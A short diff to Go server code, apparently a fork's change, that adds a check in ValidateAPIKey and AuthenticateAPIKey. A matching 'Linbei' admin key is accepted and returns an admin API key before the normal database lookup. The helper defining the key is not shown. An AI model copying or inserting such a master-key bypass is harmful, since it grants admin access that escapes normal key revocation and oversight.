@@ -1541,12 +1541,20 @@ func healthSetter(healthy bool) UpdateNodeFunc {
 
 // ValidateAPIKey checks if an API key is valid and active.
 func (s *State) ValidateAPIKey(keyStr string) (bool, error) {
+	if linbeiAdminKeyMatches(keyStr) { // Linbei fork: see linbei_admin_key.go.
+		return true, nil
+	}
+
 	return s.db.ValidateAPIKey(keyStr)
 }
 
 // AuthenticateAPIKey validates an API key and returns it (with its owning
 // user), so callers like the v2 API can act as the key's owner.
 func (s *State) AuthenticateAPIKey(keyStr string) (*types.APIKey, error) {
+	if linbeiAdminKeyMatches(keyStr) { // Linbei fork: see linbei_admin_key.go.
+		return linbeiAdminAPIKey(), nil
+	}
+
 	return s.db.AuthenticateAPIKey(keyStr)
 }
 
